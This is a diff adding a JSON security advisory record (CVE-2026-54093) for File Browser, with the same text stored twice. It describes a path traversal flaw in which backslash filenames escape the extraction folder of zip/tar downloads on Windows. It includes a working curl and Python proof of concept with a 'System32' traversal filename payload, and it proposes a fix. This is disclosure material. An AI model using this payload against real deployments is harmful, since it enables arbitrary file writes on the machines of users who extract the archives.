@@ -1,0 +1,107 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-54093",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 6.2,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:N/SI:H/SA:L"
+      }
+    },
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "description": "### Summary\nfilebrowser builds the download-as-zip / download-as-tar archive entry names with `filepath.ToSlash`, which on a Linux host is a no-op for backslashes (`\\` is only a path separator on Windows). A file whose name contains Windows-style traversal (`..\\..\\..\\evil.txt`) is accepted by the resource handlers, stored on the Linux filesystem with a literal backslash name, and then emitted **verbatim** as the archive entry name. Windows extractors (Explorer, 7-Zip, WinRAR, .NET `ZipFile.ExtractToDirectory`) interpret `\\` as a path separator and write the extracted file **outside** the extraction directory - arbitrary file write on the victim who downloads and extracts the archive.\n\n### Details\n`http/raw.go` `getFiles()` constructs the in-archive name and passes it to `github.com/mholt/archives@v0.1.5`:\n```go\nnameInArchive := strings.TrimPrefix(path, commonPath)\nnameInArchive = strings.TrimPrefix(nameInArchive, string(filepath.Separator))\nnameInArchive = filepath.ToSlash(nameInArchive) // Linux no-op: ToSlash only rewrites '\\' on Windows\narchiveFiles = append(archiveFiles, archives.FileInfo{\n    FileInfo:      info,\n    NameInArchive: nameInArchive,\n    Open:          func() (fs.File, error) { return d.user.Fs.Open(path) },\n})\n```\nOn Linux `filepath.Separator == '/'`, so `filepath.ToSlash` leaves any literal backslash in the stored filename untouched. `mholt/archives` `nameOnDiskToNameInArchive` then writes that name verbatim into the zip/tar central directory.\n\nThe filename reaches the filesystem because the resource create path (`http/resource.go` `resourcePostHandler`) derives the name from `r.URL.Path` and cleans it with `path.Clean(\"/\" + ...)`, which treats only `/` as a separator. A URL-encoded backslash segment (`%5C`) therefore survives cleaning, and the file is created on the Linux FS with a literal `\\` in its name. Any user with the **Create** permission (the default for new users, and signup-enabled instances let anyone self-register) can plant such a file.\n\n### PoC\nDeployed against the official image `filebrowser/filebrowser:v2.63.5` (current release, 2026-05-21).\n\n```bash\n# 1. Deploy\ndocker volume create fb-srv-vol\ndocker run -d --name fb-poc -p 8088:80 -v fb-srv-vol:/srv filebrowser/filebrowser:v2.63.5\n# wait for /health == 200; read the generated admin password from `docker logs fb-poc`\nPW=\"<password from docker logs>\"\n\n# 2. Authenticate\nTOK=$(curl -s -X POST http://localhost:8088/api/login \\\n  -H 'Content-Type: application/json' \\\n  -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"$PW\\\"}\")\n\n# 3. Create a folder, then a file whose NAME is a Windows traversal payload (backslash = %5C)\ncurl -s -o /dev/null -w \"mkdir=%{http_code}\\n\" \\\n  -X POST \"http://localhost:8088/api/resources/evilzone/\" -H \"X-Auth: $TOK\"\nFNAME='..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cevil.txt'\ncurl -s -o /dev/null -w \"putfile=%{http_code}\\n\" \\\n  -X POST \"http://localhost:8088/api/resources/evilzone/${FNAME}?override=true\" \\\n  -H \"X-Auth: $TOK\" --data-binary 'PWNED-BY-TONGHUAROOT'\n\n# 4. Download the folder as a zip and inspect the entry name\ncurl -s -o /tmp/fb_evil.zip \"http://localhost:8088/api/raw/evilzone?algo=zip\" -H \"X-Auth: $TOK\"\npython3 - <<'PY'\nimport zipfile, binascii\nz = zipfile.ZipFile('/tmp/fb_evil.zip')\nprint(\"entries:\", [i.orig_filename for i in z.infolist()])\ndata = open('/tmp/fb_evil.zip','rb').read()\nidx = data.find(b'PK\\x01\\x02')\nprint(\"central-dir hex:\", binascii.hexlify(data[idx:idx+72]).decode())\nprint(\"contains 0x5c backslash byte:\", b'\\x5c' in data[idx:idx+200])\nPY\n```\n\n**Observed output (verbatim):**\n```\nmkdir=200\nputfile=200\nentries: ['..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\evil.txt']\ncentral-dir hex: 504b01021403140008080000f002c25cc0fcca3f1400000014000000280009000000000000000000a081000000002e2e5c2e2e5c2e2e5c2e2e5c2e2e5c57696e646f77735c537973\ncontains 0x5c backslash byte: True\n```\nServer-side, the file exists with a literal backslash name:\n```\n-rw-r-----  1 user user  20  ..\\..\\..\\..\\..\\Windows\\System32\\evil.txt\n```\nThe central-directory hex tail `2e2e5c 2e2e5c 2e2e5c 2e2e5c 2e2e5c 57696e646f7773 5c 53797973...` decodes to `..\\..\\..\\..\\..\\Windows\\Sys...`.\n\n**Negative control** - a normal filename produces a clean entry, and a forward-slash traversal is correctly stripped by `path.Clean`:\n```\nsafezone entries: ['normal.txt']\nPUT ..%2F..%2Fevil2.txt  ->  HTTP 301  (collapsed by path.Clean; nothing escapes)\n```\nThis proves `/` is handled but `\\` is the unhandled gap.\n\nTo observe the Windows-side traversal effect, extract `fb_evil.zip` on Windows:\n```powershell\nExpand-Archive -Path .\\fb_evil.zip -DestinationPath .\\out -Force\n# 7-Zip / WinRAR with default settings honor the ..\\ parents and write outside .\\out\n```\n\n### Impact\nArbitrary file write (CWE-22) on any party who downloads a folder/selection as an archive from filebrowser and extracts it on Windows. The attacker is any authenticated user with Create permission (or an anonymous user on signup-enabled instances); the victim is typically an administrator or another user who is given access to the attacker's directory (e.g. via a share) and downloads it as a zip/tar. Because filebrowser is frequently deployed as a multi-user file server, this crosses a trust boundary: a low-privileged or untrusted uploader can plant files that compromise the machine of anyone who downloads and extracts the archive on Windows (e.g. writing to Startup folders or overwriting executables/config in the extraction root's parent tree).\n\n### Affected versions\nAll current versions through v2.63.5 (verified against the v2.63.5 release image). The `filepath.ToSlash`-based normalization in `http/raw.go` `getFiles()` is the root cause; `github.com/mholt/archives@v0.1.5` passes the name through verbatim.\n\n### Suggested fix\nNormalize Windows separators out of the in-archive name regardless of host OS, in `http/raw.go` `getFiles()` before constructing `archives.FileInfo`:\n```go\nnameInArchive = filepath.ToSlash(nameInArchive)\nnameInArchive = strings.ReplaceAll(nameInArchive, \"\\\\\", \"/\") // strip Windows separators on any host\n```\nOptionally also reject or sanitize filenames containing `\\` at create time in `http/resource.go` so backslash names cannot be stored at all. This mirrors the canonical fix for the equivalent Gotenberg issue, where POSIX-only `filepath.Base` likewise failed to strip backslashes on Linux.",
+    "ghsa_id": "GHSA-gxjx-7m74-hcq8",
+    "html_url": "https://github.com/advisories/GHSA-gxjx-7m74-hcq8",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-gxjx-7m74-hcq8"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54093"
+      }
+    ],
+    "published_at": "2026-06-12T21:53:18Z",
+    "references": [
+      "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-gxjx-7m74-hcq8",
+      "https://github.com/filebrowser/filebrowser/commit/847d08bdd135e5c3659f2e6dea2f0cd36617af9b",
+      "https://github.com/filebrowser/filebrowser/releases/tag/v2.63.6",
+      "https://github.com/advisories/GHSA-gxjx-7m74-hcq8"
+    ],
+    "severity": "medium",
+    "summary": "File Browser: FilePath traversal in download-as-zip/tar via Windows-style backslash separators in stored filenames",
+    "updated_at": "2026-06-12T21:53:19Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "2.63.6",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "vulnerable_version_range": "<= 2.63.5"
+      },
+      {
+        "first_patched_version": null,
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser"
+        },
+        "vulnerable_version_range": "<= 1.11.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-gxjx-7m74-hcq8",
+  "repo": {
+    "cve_id": "CVE-2026-54093",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "description": "### Summary\r\nfilebrowser builds the download-as-zip / download-as-tar archive entry names with `filepath.ToSlash`, which on a Linux host is a no-op for backslashes (`\\` is only a path separator on Windows). A file whose name contains Windows-style traversal (`..\\..\\..\\evil.txt`) is accepted by the resource handlers, stored on the Linux filesystem with a literal backslash name, and then emitted **verbatim** as the archive entry name. Windows extractors (Explorer, 7-Zip, WinRAR, .NET `ZipFile.ExtractToDirectory`) interpret `\\` as a path separator and write the extracted file **outside** the extraction directory - arbitrary file write on the victim who downloads and extracts the archive.\r\n\r\n### Details\r\n`http/raw.go` `getFiles()` constructs the in-archive name and passes it to `github.com/mholt/archives@v0.1.5`:\r\n```go\r\nnameInArchive := strings.TrimPrefix(path, commonPath)\r\nnameInArchive = strings.TrimPrefix(nameInArchive, string(filepath.Separator))\r\nnameInArchive = filepath.ToSlash(nameInArchive) // Linux no-op: ToSlash only rewrites '\\' on Windows\r\narchiveFiles = append(archiveFiles, archives.FileInfo{\r\n    FileInfo:      info,\r\n    NameInArchive: nameInArchive,\r\n    Open:          func() (fs.File, error) { return d.user.Fs.Open(path) },\r\n})\r\n```\r\nOn Linux `filepath.Separator == '/'`, so `filepath.ToSlash` leaves any literal backslash in the stored filename untouched. `mholt/archives` `nameOnDiskToNameInArchive` then writes that name verbatim into the zip/tar central directory.\r\n\r\nThe filename reaches the filesystem because the resource create path (`http/resource.go` `resourcePostHandler`) derives the name from `r.URL.Path` and cleans it with `path.Clean(\"/\" + ...)`, which treats only `/` as a separator. A URL-encoded backslash segment (`%5C`) therefore survives cleaning, and the file is created on the Linux FS with a literal `\\` in its name. Any user with the **Create** permission (the default for new users, and signup-enabled instances let anyone self-register) can plant such a file.\r\n\r\n### PoC\r\nDeployed against the official image `filebrowser/filebrowser:v2.63.5` (current release, 2026-05-21).\r\n\r\n```bash\r\n# 1. Deploy\r\ndocker volume create fb-srv-vol\r\ndocker run -d --name fb-poc -p 8088:80 -v fb-srv-vol:/srv filebrowser/filebrowser:v2.63.5\r\n# wait for /health == 200; read the generated admin password from `docker logs fb-poc`\r\nPW=\"<password from docker logs>\"\r\n\r\n# 2. Authenticate\r\nTOK=$(curl -s -X POST http://localhost:8088/api/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"$PW\\\"}\")\r\n\r\n# 3. Create a folder, then a file whose NAME is a Windows traversal payload (backslash = %5C)\r\ncurl -s -o /dev/null -w \"mkdir=%{http_code}\\n\" \\\r\n  -X POST \"http://localhost:8088/api/resources/evilzone/\" -H \"X-Auth: $TOK\"\r\nFNAME='..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cevil.txt'\r\ncurl -s -o /dev/null -w \"putfile=%{http_code}\\n\" \\\r\n  -X POST \"http://localhost:8088/api/resources/evilzone/${FNAME}?override=true\" \\\r\n  -H \"X-Auth: $TOK\" --data-binary 'PWNED-BY-TONGHUAROOT'\r\n\r\n# 4. Download the folder as a zip and inspect the entry name\r\ncurl -s -o /tmp/fb_evil.zip \"http://localhost:8088/api/raw/evilzone?algo=zip\" -H \"X-Auth: $TOK\"\r\npython3 - <<'PY'\r\nimport zipfile, binascii\r\nz = zipfile.ZipFile('/tmp/fb_evil.zip')\r\nprint(\"entries:\", [i.orig_filename for i in z.infolist()])\r\ndata = open('/tmp/fb_evil.zip','rb').read()\r\nidx = data.find(b'PK\\x01\\x02')\r\nprint(\"central-dir hex:\", binascii.hexlify(data[idx:idx+72]).decode())\r\nprint(\"contains 0x5c backslash byte:\", b'\\x5c' in data[idx:idx+200])\r\nPY\r\n```\r\n\r\n**Observed output (verbatim):**\r\n```\r\nmkdir=200\r\nputfile=200\r\nentries: ['..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\evil.txt']\r\ncentral-dir hex: 504b01021403140008080000f002c25cc0fcca3f1400000014000000280009000000000000000000a081000000002e2e5c2e2e5c2e2e5c2e2e5c2e2e5c57696e646f77735c537973\r\ncontains 0x5c backslash byte: True\r\n```\r\nServer-side, the file exists with a literal backslash name:\r\n```\r\n-rw-r-----  1 user user  20  ..\\..\\..\\..\\..\\Windows\\System32\\evil.txt\r\n```\r\nThe central-directory hex tail `2e2e5c 2e2e5c 2e2e5c 2e2e5c 2e2e5c 57696e646f7773 5c 53797973...` decodes to `..\\..\\..\\..\\..\\Windows\\Sys...`.\r\n\r\n**Negative control** - a normal filename produces a clean entry, and a forward-slash traversal is correctly stripped by `path.Clean`:\r\n```\r\nsafezone entries: ['normal.txt']\r\nPUT ..%2F..%2Fevil2.txt  ->  HTTP 301  (collapsed by path.Clean; nothing escapes)\r\n```\r\nThis proves `/` is handled but `\\` is the unhandled gap.\r\n\r\nTo observe the Windows-side traversal effect, extract `fb_evil.zip` on Windows:\r\n```powershell\r\nExpand-Archive -Path .\\fb_evil.zip -DestinationPath .\\out -Force\r\n# 7-Zip / WinRAR with default settings honor the ..\\ parents and write outside .\\out\r\n```\r\n\r\n### Impact\r\nArbitrary file write (CWE-22) on any party who downloads a folder/selection as an archive from filebrowser and extracts it on Windows. The attacker is any authenticated user with Create permission (or an anonymous user on signup-enabled instances); the victim is typically an administrator or another user who is given access to the attacker's directory (e.g. via a share) and downloads it as a zip/tar. Because filebrowser is frequently deployed as a multi-user file server, this crosses a trust boundary: a low-privileged or untrusted uploader can plant files that compromise the machine of anyone who downloads and extracts the archive on Windows (e.g. writing to Startup folders or overwriting executables/config in the extraction root's parent tree).\r\n\r\n### Affected versions\r\nAll current versions through v2.63.5 (verified against the v2.63.5 release image). The `filepath.ToSlash`-based normalization in `http/raw.go` `getFiles()` is the root cause; `github.com/mholt/archives@v0.1.5` passes the name through verbatim.\r\n\r\n### Suggested fix\r\nNormalize Windows separators out of the in-archive name regardless of host OS, in `http/raw.go` `getFiles()` before constructing `archives.FileInfo`:\r\n```go\r\nnameInArchive = filepath.ToSlash(nameInArchive)\r\nnameInArchive = strings.ReplaceAll(nameInArchive, \"\\\\\", \"/\") // strip Windows separators on any host\r\n```\r\nOptionally also reject or sanitize filenames containing `\\` at create time in `http/resource.go` so backslash names cannot be stored at all. This mirrors the canonical fix for the equivalent Gotenberg issue, where POSIX-only `filepath.Base` likewise failed to strip backslashes on Linux.\r\n",
+    "ghsa_id": "GHSA-gxjx-7m74-hcq8",
+    "html_url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-gxjx-7m74-hcq8",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-gxjx-7m74-hcq8"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54093"
+      }
+    ],
+    "published_at": "2026-06-06T05:55:25Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Path traversal in download-as-zip/tar via Windows-style backslash separators in stored filenames",
+    "updated_at": "2026-06-11T21:46:15Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "patched_versions": "2.63.6",
+        "vulnerable_version_range": "<= 2.63.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "filebrowser/filebrowser"
+}
